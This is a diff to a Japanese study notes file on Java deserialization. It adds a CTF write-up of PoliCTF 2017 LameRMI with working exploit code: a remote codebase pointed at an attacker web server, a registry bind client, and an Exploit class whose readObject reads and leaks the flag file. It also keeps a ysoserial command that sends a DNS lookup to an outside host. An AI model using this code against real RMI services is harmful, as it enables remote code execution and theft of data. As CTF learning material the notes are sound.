@@ -9,12 +9,6 @@
   - [gadget](#gadget)
 - [writeup](#writeup)
   - [Deserialize readObject() to RCE / craft UNC SMB-Server's path (CVE-2018-16364)](#deserialize-readobject-to-rce--craft-unc-smb-servers-path-cve-2018-16364)
-  - [ysoserial CommonsBeanutils / reverse DNS Request with flag (Defiltrate)](#ysoserial-commonsbeanutils--reverse-dns-request-with-flag-defiltrate)
-  - [(PoliCTF 2017 LameRMI)](#polictf-2017-lamermi)
-  - [](#)
-  - [](#-1)
-  - [](#-2)
-  - [](#-3)
 - [DeserLab](#deserlab)
   - [setup](#setup)
   - [serializedデータの抽出](#serialized%E3%83%87%E3%83%BC%E3%82%BF%E3%81%AE%E6%8A%BD%E5%87%BA)
@@ -500,10 +494,135 @@ java -jar ysoserial.jar CommonsBeanutils1 'dig rce.ef8d2b0eafff5eb0e48f.d.reques
 java -jar ysoserial.jar CommonsBeanutils1 'dig rce.ef8d2b0eafff5eb0e48f.d.requestbin.net' | base64 -w0
 ```
 
-## (PoliCTF 2017 LameRMI)
+## RMI Registry / java.rmi.server.codebase / config vuln (PoliCTF 2017 LameRMI)
 https://github.com/PoliCTF/sources2017/blob/master/pwn-lamermi/writeup.md  
 - **entrypoint**  
+1999ポートにJavaのRMI Registryが、8000ポートにWebサーバーが動いているらしい。  
+問題文に「Javaの設定が脆弱な状態になっている」的なヒントがあるらしい。  
+JavaのRMI Registryは設定が`userCodebaseOnly=false`となっており、クラスがローカルで解決できない場合(存在しないクラスをよびだそうとした場合)`java.rmi.server.codebase=`に設定されているWebサーバーにクラスを探しに行くらしい。  
+Javaを実行するRMIとRMI Registryは別。  
+そして、その探しにいくWebサーバーはクライアントがレジストリに対して指定できるらしい！！！(レジストリに対して「`java.rmi.server.codebase=http://malicious`にアクセスしてクラスを取得してね」ってクライアントが設定できるらしい？？)  
+https://docs.oracle.com/javase/jp/1.5.0/guide/rmi/codebase.html  
+```txt
+java \
+ -Djava.security.policy=security.policy \
+ -Djava.rmi.server.useCodebaseOnly=false \
+ -Djava.rmi.server.hostname=lamermi.chall.polictf.it \
+ -jar lamermi-1.0-SNAPSHOT.jar
+```
+また、以下のように全エントリに対して実行権限を付与しているのも良くないらしい？  
+上記で挿入したヤバいクラスのヤバいメソッドを制限なしで実行できるからかな。  
+```txt
+grant {
+    permission java.security.AllPermission;
+};
+```
+また、http serverには以下の`AverageService`インタフェースだけが書かれたソースファイルが置かれているらしい。  
+```java
+public interface AverageService extends Remote {
+    Double average(List<Integer> integerList) throws RemoteException;
+}
+```
+実際、以下のようにしてレジストリにアクセスすることで、`AverageService`というサービスが使えることがわかる。  
+```java
+Registry registry = LocateRegistry.getRegistry("lamermi.chall.polictf.it", 1099);
+System.out.println("registry found");
+
+String[] ports = registry.list();
+for (String port: ports) {
+    System.out.println(port);
+}
+// prints "AverageService"
+```
+以下のようにして使うこともできるらしい。  
+```java
+AverageService averageService = (AverageService) registry.lookup("AverageService");
+ArrayList<Integer> myIntList = new ArrayList<Integer>();
+myIntList.add(1);
+myIntList.add(2);
+myIntList.add(3);
+System.out.println(averageService.average(myIntList)); // prints "2.0"
+```
+どうやらRMIはRMI Registryにあるクラスを取得した後に一度シリアライズするらしく、それをまたデシリアライズしてからチェックするらしい。つまり、チェックする前にデシリアライズしてしまう！  
+したがって、`Serializerable`インターフェースを実装した`Exploit`クラスを作成してそこに任意の処理を書いた`readObject`を定義しておけば、Exploitクラスをデシリアライズするときにそっちの`readObject`でデシリアライズするようになって任意の処理を実行できる！  
+  
 - **payload**  
+以下のコマンドを攻撃者側で実行してコンパイル済みのMain.classを実行すればいいっぽい？  
+このように`-D`で指定すると、この設定がRMI Registryに反映されるっぽい？？  
+```txt
+java -Djava.rmi.server.codebase=http://attacker.webserver/folder Main
+```
+RMI Registryを見つけて接続してExploitクラスのインスタンスをRegistryに登録する。  
+```java
+public static void main(String args[]) {
+
+  AverageService service = null;
+  Registry reg1 = null;
+  Remote p = new Payload();
+
+  String host = args[0];
+  int port = Integer.parseInt(args[1]);
+
+  System.out.println("Searching registry at "+host+":"+port);
+
+  try {
+      reg1 = LocateRegistry.getRegistry(host,port);
+  } catch (RemoteException e) {
+      System.out.println("No registry   found!\nAborting...");
+      e.printStackTrace();
+      return;
+  } finally {
+      System.out.println("Registry found!");
+  }
+
+  System.out.println("Starting exploit...");
+  try {
+      reg1.bind("new service", p);
+  } catch (RemoteException | AlreadyBoundException e) {
+      System.out.println(e.getMessage());
+  }
+}
+```
+デシリアライズ時に`readObject`によって`explot()`が実行される。  
+なんか例外を発生させてその例外の中でFlagを表示してるっぽい？  
+```java
+public class Exploit implements Remote, Serializable {
+  public void exploit() throws IOException {
+      /*
+       Cat flag is not java enough
+      */
+      BufferedReader br = new BufferedReader(new FileReader("flag"));
+      try {
+          StringBuilder sb = new StringBuilder();
+          String line = br.readLine();
+
+          while (line != null) {
+              sb.append(line);
+              sb.append(System.lineSeparator());
+              line = br.readLine();
+          }
+          String everything = sb.toString();
+          /*
+            We cannot use System.out to print the string
+            so I decided to insert the result of the exploit inside
+             an exception.
+            All the unhandled exceptions are kindly sent back to the client.
+          */
+          IOException e = new
+          IOException(everything);
+          throw e;
+      } finally {
+          br.close();
+      }
+  }
+
+  private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException {
+      exploit();
+      in.defaultReadObject();
+  }
+}
+```
+
 
 ## 
 - **entrypoint**  
